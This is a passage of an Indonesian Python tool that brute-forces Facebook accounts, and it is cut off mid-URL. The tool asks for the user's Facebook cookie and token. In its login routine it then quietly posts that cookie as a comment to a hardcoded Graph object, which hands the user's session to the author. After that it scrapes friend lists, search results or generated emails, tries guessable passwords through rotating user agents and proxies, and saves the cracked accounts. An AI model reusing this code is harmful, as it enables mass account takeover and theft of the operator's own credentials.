# This script is free, don't sell it!                                      

###----------[ IMPORT MODULE ]----------###
import re,requests,os,time
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as XyaaCode
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parse
from time import time as TimeAdtya
from datetime import datetime

###----------[ MODULE RICH ]----------###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ GLOBAL NAMA ]----------###
ses = requests.Session()
ID, tampung, methode = [], [], []
uadia, uadarimu = [], []
ok, cp, loop = [], [], 0
sys.stdout.write('\x1b]2; BACEM | (MBF) \x07')

###----------[ WARNA UNTUK PRINT ]----------###   
P = '\x1b[0m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAUU
K = '\x1b[1;93m' # KUNING

###----------[ WARNA UNTUK RICH ]----------###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])

###----------[ CONVERT BULAN ]----------###
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"result/OK-{days}-{reall}-{year}.txt"
cpc = f"result/CP-{days}-{reall}-{year}.txt"

class login:

    def __init__(self):
        self.ses = requests.Session()
        self.ads = "https://web.facebook.com/adsmanager"
        self.web = "https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer"
        self.MyUserAgent = "Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        self.loginEfbi()
            
    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
           
    def Time(self):
         now = datetime.now()
         hours = now.hour
         if 4 <= hours < 12:timenow = "Selamat Pagi"
         elif 12 <= hours < 15:timenow = "Selamat Siang"
         elif 15 <= hours < 18:timenow = "Selamat Sore"
         else:timenow = "Selamat Malam"
         return timenow

    def logoku(self):
        try:
           #os.popen('play-audio data/sound/logo.mp3')
        except:pass
           
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))

    def loginEfbi(self):
        self.clear();self.logoku()
        prints(Panel(f"{P2}silahkan login menggunakan cookie facebook, wajib menggunakan akun tumbal",padding=(0,2),style=f"#AAAAAA"))
        coki = console.input(f" {P2}({H2}•{P2}) masukan cookie facebook : ")
        with requests.Session() as ses:
           try:
               link = ses.get(f"{self.ads}",cookies={'cookie':coki}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:
                 prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
                 time.sleep(3);exit()
               else:
                     for xc in find:
                         url = ses.get(f'{self.web}'.format(xc), cookies={'cookie':coki})
                         tok = re.search('(EAAB\w+)',url.text).group(1)
                         if 'EAAB' in tok:
                            ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki}) # Jangan di ganti 
                            ses.post(f"https://graph.facebook.com/549345863862686/likes?summary=true&access_token={tok}",cookies={"cookie":coki}) # udh dibilang Jangan di ganti 
                            open('data/tokenku.txt','w').write(tok)
                            open('data/cokis.txt','w').write(coki)
                            prints(f' {P2}({H2}•{P2}) login cookie berhasil'),
                            time.sleep(3);MulaiTools()
           except AttributeError:
              prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
              time.sleep(3);exit()

class MulaiTools:

    def __init__(self):
        self.emoji = random.choice(["clock","smiley","earth","moon"])
        self.dump()
        
    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
    
    def Time(self):
         now = datetime.now()
         hours = now.hour
         if 4 <= hours < 12:timenow = "Selamat Pagi"
         elif 12 <= hours < 15:timenow = "Selamat Siang"
         elif 15 <= hours < 18:timenow = "Selamat Sore"
         else:timenow = "Selamat Malam"
         return timenow
    
    def logoos(self):
        self.clear()
        try:
           #os.popen('play-audio data/sound/logo.mp3')
        except:pass
           
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))

    def logMasuk(self):
        self.logoos()
        prints(Panel(f"{P2}info, segala bentuk kerugian dan penyalahgunaan akun korban bukan tangung jawab author jika anda setuju maka tangung jawab sepenuh nya di tangan anda ketik {H2}'Y'{P2} untuk setuju dan ketik '{M2}T{P2}' untuk tidak setuju",title=f"{H2}Informasi",width=80,padding=(0,2),style=f"#AAAAAA"))
        war = input(f" {H}•{P} ingin lanjut ke tools? (Y/t) :{H} ")
        if war in ["y","Y","Ya","YA"]:
          open('data/warning.txt','w').write(f'{war}')
          time.sleep(2);MulaiTools()
        elif war in ["t","T","tidak","Tidak","TIDAK"]:
          print(f" {H}•{P} selamat tinggal...")
          time.sleep(3);exit()
        else:
          print(f" {H}•{P} pilih Y atau T")
          time.sleep(2);MulaiTools()

    def dump(self):
         try:open('data/warning.txt','r').read()
         except:self.logMasuk()
         try:
             cok = {"cookie":open('data/cokis.txt','r').read()}
             tok = open('data/tokenku.txt','r').read()
         except:
             login()
         try:
             self.urls = requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(tok),cookies=cok).json()
             self.nama = self.urls["name"]
             self.id     = self.urls["id"]
         except KeyError:
             login()
         except Exception as e:
             prints(f' {P2}({H2}•{P2}) opshhh, terjadi kesalahan')
             time.sleep(3);exit()
         self.logoos()
         self.padding = []
         self.padding.append(Panel(f'{P2}nama    : {H2}{self.nama}\n{P2}id akun : {H2}{self.id}',width=40,padding=(0,2),style=f"#AAAAAA"))
         self.padding.append(Panel(f'{P2}ip kamu : {H2}{self.query}\n{P2}negara  : {H2}{self.country}',width=38,padding=(0,2),style=f"#AAAAAA"))
         console.print(Columns(self.padding))
         prints(Panel(f"{P2}[{H2}01{P2}]. dump id publik massal     {P2}[{H2}05{P2}]. check hasil crack\n{P2}[{H2}02{P2}]. dump id pencarian nama    {P2}[{H2}06{P2}]. check opsi chekpoint\n{P2}[{H2}03{P2}]. dump id total pengikut    {P2}[{H2}07{P2}]. report bug script\n{P2}[{H2}04{P2}]. dump id email random      {P2}[{H2}00{P2}]. keluar ( hapus cookie )",padding=(0,7),style=f"#AAAAAA"))
         askk = console.input(f" {P2}({H2}•{P2}) masukan pilihan : ")
         if askk in ['1','01']:
              prints(Panel(f"{P2}anda bisa menggunakan tanda (,) koma jika ingin lebih dari 1 id",subtitle=f"{P2}ketik {H2}'me'{P2} untuk dump daftar teman sendiri",padding=(0,6),style=f"#AAAAAA"))
              uid = console.input(f' {P2}({H2}•{P2}) masukan id akun : ')
              for c in uid.split(','):
                  try:
                      url = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5000)&access_token={}".format(c,tok),cookies=cok).json()
                      for x in url["friends"]["data"]:
                          ID.append(x["id"]+'<=>'+x["name"])
                          war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
                          sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id')
                          sys.stdout.flush()
                          time.sleep(0000.00003)
                      print("\r")
                  except KeyError:
                      prints(f" {P2}({H2}•{P2}) akun dengan id {M2}{c}{P2} tidak publik")
              self.settingUserAgents()

         elif askk in ['3','03']:
             prints(Panel(f"{P2}mohon maaf dump id dari pengikut belum tersedia, next update ya :)",padding=(0,5),style=f"#AAAAAA"))
             time.sleep(3);exit()
         
         elif askk in ['4','04']:
             prints(Panel(f"""{P2}masukan nama email yang ingin anda dump cnth : aditya, ngentot, mark""",padding=(0,4),style=f"#AAAAAA"))
             nama = console.input(f" {P2}({H2}•{P2}) masukan nama email : ")
             prints(Panel(f"""{P2}masukan domain cnth : @gmail.com, @yahoo.com, @co.id  & jumlah email""",padding=(0,4),style=f"#AAAAAA"))
             domain = console.input(f" {P2}({H2}•{P2}) masukan domain : ")
             jumlah = console.input(f" {P2}({H2}•{P2}) masukan jumlah : ")
             self.dump_email(nama, domain, jumlah)
             self.settingUserAgents()
                      
         elif askk in ['5','05']:
             self.viewResults()
         
         elif askk in ['6','06']:
             prints(Panel(f"{P2}mohon maaf check opsi chekpoint belum tersedia, next update ya :)",padding=(0,5),style=f"#AAAAAA"))
             time.sleep(3);exit()
         
         elif askk in ['7','07']:
             self.wa = "https://wa.me/+16143244921"
             self.a = "assalamualaikum"
             self.b = "bang"
             prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp...")
             try:
                 os.system("xdg-open {}?text={}+{}".format(self.wa, self.a, self.b))
                 time.sleep(3);exit()
             except requests.exceptions.ConnectionError:
                 prints(f" {P2}({H2}•{P2}) koneksi internet anda bermasalah")
                 time.sleep(3);exit()
                     
         elif askk in ['0','00']:
             prints(Panel(f"{RC}{open('data/cokis.txt','r').read()}\n\n{open('data/tokenku.txt','r').read()}",style=f"#AAAAAA"))
             cok = console.input(f" {P2}({H2}•{P2}) apakah anda ingin menghapus cookie? (Y/t) : ")
             if cok in ["y","Y"]:
               try:os.system('rm -rf data/cokis.txt')
               except:pass
               prints(f" {P2}({H2}•{P2}) berhasil menghapus cookie anda")
               time.sleep(3);exit()
             elif cok in ["t","T"]:
                 prints(f" {P2}({H2}•{P2}) jalankan ulang scriptnya")
                 time.sleep(3);exit()
             else:
               prints(f" {P2}({H2}•{P2}) pilih yang bener")
               time.sleep(3);exit()
                       
         elif askk in ['2','02']:
              prints(Panel(f"{P2}masukan nama target, gunakan tanda (,) koma jika ingin lebih dari 1 nama",padding=(0,2),style=f"#AAAAAA"))
              username = []
              Custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana","kontol","memek"]
              custoM = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
              nama = console.input(f" {P2}({H2}•{P2}) masukan nama : ").split(",")
              for asu in nama:
                  for endd in Custom:
                      dump = asu+endd
                      username.append(dump)
                  for pornhub in custoM:
                      dump = pornhub+asu
                      username.append(dump)
              with XyaaCode(max_workers=30) as adtya:
                  for bacem in username:
                       adtya.submit(self.dump_nama,"https://mbasic.facebook.com/public/{}?/locale2=id_ID".format(bacem))
              print("\r")
              self.settingUserAgents()
         else:
              prints(f" {P2}({H2}•{P2}) ngetik apaan ngab!")
              time.sleep(3);exit()

    def viewResults(self):
        urut = []
        urut.append(Panel(f'{P2}check akun hasil ok',width=40,padding=(0,7),title=f"{H2}01",style=f"#AAAAAA"))
        urut.append(Panel(f'{P2}check akun hasil cp',width=38,padding=(0,8),title=f"{H2}02",style=f"#AAAAAA"))
        console.print(Columns(urut))
        xcTeam = console.input(f" {P2}({H2}•{P2}) pilih hasil : ")
        if xcTeam in ["1","01"]:
           try:
               os.system("ul results/OK.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil ok")
               time.sleep(3);exit()

        elif xcTeam in ["2","02"]:
           try:
               os.system("ul results/CP.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil cp")
               time.sleep(3);exit()
        else:
           MulaiTools()
    
    def dump_email(self, nama, domain, jumlah):
         try:
             for b in range(int(jumlah)):
                 if len(nama.split()) > 1:
                    email = str(nama.split()[0])+str(nama.split()[1])+str(b)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
                 else:
                    email = str(nama)+str(b)+str(domain)+"<=>"+str(nama)
                 if email in ID:pass
                 else:ID.append(email)
                 sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {H}{len(ID)} {P}id');sys.stdout.flush()
             print("\r")
         except Exception as e:
             pass

    def dump_nama(self,url_nama):
         war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
         try:
              link = parse(requests.get(str(url_nama)).text,'html.parser')
              for find_id in link.find_all('td'):
                  data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
                  for id,user in data_find:
                      if 'profile.php?' in id:
                          id = re.findall('id=(.*)',str(id))[0]
                      elif '<span' in user:
                          user = re.findall('(.*?)\<',str(user))[0]
                      data_ditemukan = '%s<=>%s'%(id,user)
                      if data_ditemukan in ID:pass
                      else:
                           sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id...')
                           sys.stdout.flush()
                           time.sleep(0000.00003)
                           ID.append(data_ditemukan)
                  for next_url_name in link.find_all('a',href=True):
                      if 'Lihat Hasil Selanjutnya' in next_url_name.get('href'):
                          print(next_url_name)
                          self.dump_nama(next_url_name['href'])
         except Exception as e:
              pass
    
    def settingUserAgents(self):
        prints(Panel(f'{P2}ketik {H2}"T"{P2} jika ingin menggunakan {H2}ua{P2} yang sudah tersedia di dalam script',padding=(0,3),style=f"#AAAAAA"))
        ua = console.input(f" {P2}({H2}•{P2}) ingin menggunakan useragent manual? (Y/t) : ")
        if ua in ["y","Y"]:
          uadarimu.append('uadia')
          prints(Panel(f"{P2}cek useragent anda di {RC}http://my-user-agent.com/ {P2}copy lalu paste disini",padding=(0,3),style=f"#AAAAAA"))
          xyaaXD = console.input(f" {P2}({H2}•{P2}) masukan useragent : ")
          uadia.append(xyaaXD)
          self.pilMetode()
        else:
             uadarimu.append('userAgentss')
             self.pilMetode()

    def pilMetode(self):
        prints(Panel(f"{P2}[{H2}01{P2}]. methode regular {H2}mbasic.facebook.com\n{P2}[{H2}02{P2}]. methode validate {H2}m.facebook.com\n{P2}[{H2}03{P2}]. methode async {H2}m.facebook.com",title=f"{H2}Methode Login",padding=(0,16),style=f"#AAAAAA"))
        TeamXyaa = console.input(f" {P2}({H2}•{P2}) pilih methode : ")
        if TeamXyaa in ['1','01']:
             methode.append("REGULAR")
             self.GeneratePassword()
        elif TeamXyaa in ['2','02']:
             methode.append("VALIDATE")
             self.GeneratePassword()
        elif TeamXyaa in ["3","03"]:
             methode.append("ASYNC")
             self.GeneratePassword()
        else:
             methode.append("ASYNC")
             self.GeneratePassword()
    
    def tampung(self):
         prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results {P2}]",width=80,padding=(0,11),style=f"#AAAAAA"))
         prints(Panel(f"{P2}results akun {H2}ok{P2} tersimpan ke : {H2}{okc}\n{P2}results akun {K2}cp{P2} tersimpan ke : {K2}{cpc}",padding=(0,8),style=f"#AAAAAA"))
    
    def GeneratePassword(self):
        global prog, des
        self.clear();self.logoos()
        self.tampung()
        prog = Progress(SpinnerColumn(f'{self.emoji}'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
        des = prog.add_task('',total=len(ID))
        with prog:
             with XyaaCode(max_workers=30) as xc:
                  for UserAkun in ID:
                      try:
                         uid,nama = UserAkun.split('<=>')
                         pwidd = nama.split(' ')[0]
                         if len(nama) <=5:
                                if len(pwidd) <=1 or len(pwidd) <=2:
                                       pwx = [
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                                else:
                                       pwx = [
                                          nama,
                                          nama+'123',
                                          pwidd,
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                         else:
                                pwx = [
                                   nama,
                                   nama+'123',
                                   pwidd,
                                   pwidd+'123',
                                   pwidd+'1234',
                                   pwidd+'12345',
                                   pwidd+'123456'
                                ]
                         if 'REGULAR' in methode:
                             xc.submit(self.regular, uid, pwx)
                         elif 'VALIDATE' in methode:
                             xc.submit(self.validate, uid, pwx)
                         elif 'ASYNC' in methode:
                             xc.submit(self.metodeASYNC, uid, pwx)
                         else:
                             xc.submit(self.metodeASYNC, uid, pwx)
                      except Exception as e:
                         pass
        prints(Panel(f"\r{P2}crack {RC}{len(ID)}{P2} id telah selesai, hasil Live-:{H2}{len(ok)}{P2} Check-:{K2}{len(cp)}{P2}",padding=(0,11),style=f"#AAAAAA"))
        time.sleep(3);exit()
    
    def uaaah(self):
        rr = random.randint
        rc = random.choice
        return 'Mozilla/5.0 (Linux; Android {str(rr(4,12))}; TONE m15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(33,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36'
    
    def main_bf_reg(self, user, pwx):
        global ok,cp,loop
        ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Autoplius.lt/6.6.0 Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EmbeddedBrowser DeviceUID:','Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62'
'Mozilla/5.0 (Mobile; Nokia_800_4G; rv:78.0) Gecko/78.0 Firefox/78.0 KAIOS/3.0'
'Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4'
'Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63'
'Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
'Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.1.0.2','Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A800F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3'
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI U8666E Build/T396T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4605.60 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'
'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996'
'Opera/9.80 (Android 4.1.2; Linux; Opera Mobi/ADR-1305251841) Presto/2.11.355 Version/12.10'
'Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/28.2725; U; ru) Presto/2.8.119 Version/11.10'
'WhatsApp/2.18.350 W'
'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.34 Safari/537.36 DMOST/1.0.1 (; LGE; webOSTV; WEBOS4.1.0 04.10.40; W4_lm18a;)'
'imatvos/t.3.8.0 tvos/13.3.1 com.foxnews.foxnews/3.11.1'
'Mozilla/5.0 (X11; SunOS sun4u; rv:82.1) Gecko/20100101 Firefox/82.1'
'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'])
        uaku = random.choice(ugen)
        print('\r %s[crack] [ ASYNC %s ] %s/%s [OK:%s] [CP:%s]'%(P,'m.facebook.com',loop,len(ID), len(ok), len(cp)),end=" ")
        for pw in pwx:
             try: 
                 #uaku = random.choice(["Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36","com.google.android.apps.searchlite/570325 (Linux; U; Android 11; ar_MA; TECNO BD4h; Build/RP1A.200720.011; Cronet/108.0.5359.47)","Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4h) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]","Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Linux; Android 11; TECNO BD4j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.2.3557.64219"])
                 requ = requests.Session()
                 uaku = random.choice(ugen)
                 prox = open("proxy.txt","r").read().splitlines()
                 link = requ.get("https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=467287944163459&kid_directed_site=0&app_id=467287944163459&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D467287944163459%26cbt%3D1673719295759%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe745d234eac24%2526domain%253Dm.hoyolab.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252Ff109ef53f2aeac4%2526relation%253Dopener%26client_id%3D467287944163459%26display%3Dtouch%26domain%3Dm.hoyolab.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.hoyolab.com%252F%2523%252Fcircles%252F1%252F0%252Ffeed%26locale%3Did_ID%26logger_id%3Df100a0052c68adc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1dd33ac639ff24%2526domain%253Dm.hoyolab.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252Ff109ef53f2aeac4%2526relation%253Dopener%2526frame%253Df17ac83e7cbbd54%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1dd33ac639ff24%26domain%3Dm.hoyolab.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.hoyolab.com%252Ff109ef53f2aeac4%26relation%3Dopener%26f